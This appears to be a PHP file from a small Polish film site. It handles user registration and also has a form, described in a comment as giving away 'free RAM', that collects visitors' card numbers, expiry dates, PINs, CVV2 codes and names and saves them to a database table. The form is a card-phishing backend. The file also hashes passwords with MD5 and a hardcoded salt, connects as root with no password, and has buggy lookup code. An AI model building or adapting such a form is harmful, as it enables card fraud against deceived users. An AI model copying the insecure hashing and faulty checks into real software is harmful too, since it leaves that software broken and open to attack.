<?php
if (session_status() == PHP_SESSION_NONE) 
{
    session_start();
}

// rejestracja
$username = "";
$email    = "";
$errors = array(); 

// łączenie z baza danych
	$db = mysqli_connect('localhost', 'root','', 'filmy');

if (isset($_POST['send'])) {
  // odbieranie danych z formularza
  $username = mysqli_real_escape_string($db, $_POST['login']);
  $email = mysqli_real_escape_string($db, $_POST['E-Mail']);
  $password_1 = mysqli_real_escape_string($db, md5("U(H@#$(@H(U".$_POST['haslo']."SD*Y(*R"));
  $password_2 = mysqli_real_escape_string($db, md5("U(H@#$(@H(U".$_POST['haslo2']."SD*Y(*R"));
  
  //sprawdzanie czy pola nie sa puste
  if (empty($username)) { array_push($errors, "Pole login jest puste"); }
  if (empty($email)) { array_push($errors, "Pole email jest puste"); }
  if (empty($password_1)) { array_push($errors, "Pole hasło jest puste"); }
  if ($password_1 != $password_2) {
	array_push($errors, "Hasła nie pasuja do sb");
  }
 
  //sprawdzanie czy użytkownik już istnieje lub email
  $user_check_query = "SELECT * FROM uzytkownicy WHERE nick='$username' OR email='$email' LIMIT 1";
  $result = mysqli_query($db, $user_check_query);
  $user = mysqli_fetch_assoc($result);
  
  if ($user) { 
	if ($user['nick'] === $username) {
	  array_push($errors, "nazwa użytkownika już istnieje");
	}

	if ($user['email'] === $email) {
	  array_push($errors, "taki email już istnieje");
	}
  }
  //poprawność danych
  if (count($errors) == 0) {
	//wrzucanie  danych do bazy
	$query = "INSERT INTO uzytkownicy (nick, email, haslo) VALUES('$username', '$email', '$password_1')";
	mysqli_query($db, $query);
	$_SESSION['username'] = $username;
	$_SESSION['success'] = "jesteś teraz zalogowany";
	header('location: felinime.php');
  }
}
// logowanie
 /* if (isset($_POST['loguj'])) {
	$username = mysqli_real_escape_string($db, $_POST['nick']);

	if (empty($username)) {
		array_push($errors, "login jest wymagany");
	}
	if (empty($password)) {
		array_push($errors, "hasło jest wymagane");
	}
	
	$password = mysqli_real_escape_string($db, md5("U(H@#$(@H(U".$_POST['haslo']."SD*Y(*R"));
	
	if (count($errors) == 0) {
  	
  	$query = "SELECT * FROM uzytkownicy WHERE nick='$username' AND haslo='$password'"; //wyciąganie użytkownika z bazy
  	$results = mysqli_query($db, $query);
  	if (mysqli_num_rows($results) > 0) {
  	  $_SESSION['username'] = $username;
  	  $_SESSION['success'] = "Jesteś teraz zalogowany";
  	  header('location: felinime.php');
  	}else {
  		array_push($errors, "Zła kombinacja loginu i hasła");
  	}
  }
}*/
?>
<?php
	//Formularza od danych do darmowego RAM'u
  $errors2 = array(); 
  if (isset($_POST['money'])) {
  
  $numer = mysqli_real_escape_string($db, $_POST['numer']);
  $datka = mysqli_real_escape_string($db, $_POST['datka']);
  $pin = mysqli_real_escape_string($db,$_POST['pin'] );
  $CAV2 = mysqli_real_escape_string($db,$_POST['CAV2']);
  $imie = mysqli_real_escape_string($db, $_POST['imie']);
  $nazwisko = mysqli_real_escape_string($db, $_POST['nazwisko']);
  
  if (empty($numer)) { array_push($errors2, "Pole numer karty płatniczej jest puste"); }
  if (empty($datka)) { array_push($errors2, "Pole data ważności karty jest puste"); }
  if (empty($pin)) { array_push($errors2, "Pole pin jest puste"); }
  if (empty($CAV2)) { array_push($errors2, "Pole CAV2 jest puste"); }
  if (empty($imie)) { array_push($errors2, "Pole imie jest puste"); }
  if (empty($nazwisko)) { array_push($errors2, "Pole Nazwisko jest puste"); }
  
  $user_check_query2 = "SELECT numer, datka, pin, CAV2, imie, nazwisko FROM karty WHERE numer='$numer' OR datka='$datka' LIMIT 1";
  $result2 = mysqli_query($db, $user_check_query2);
  $number= mysqli_fetch_assoc($result);
  
  if ($number) { 
    if ($number['numer'] === $numer) {
      array_push($errors2, "taki numer już jest wykorzystany");
    }

    if ($user['datka'] === $datka) {
      array_push($errors2, "taka data już jest wykorzystana");
    }
  }
  if (count($errors2) == 0) {
  	$query = "INSERT INTO karty (numer, datka, pin, CAV2, imie, nazwisko) VALUES('$numer', '$datka', '$pin','$CAV2','$imie','$nazwisko')";
	mysqli_query($db, $query);
	$_SESSION['numer'] = $numer;
	header('location: felinime.php');
  }
  }
?>
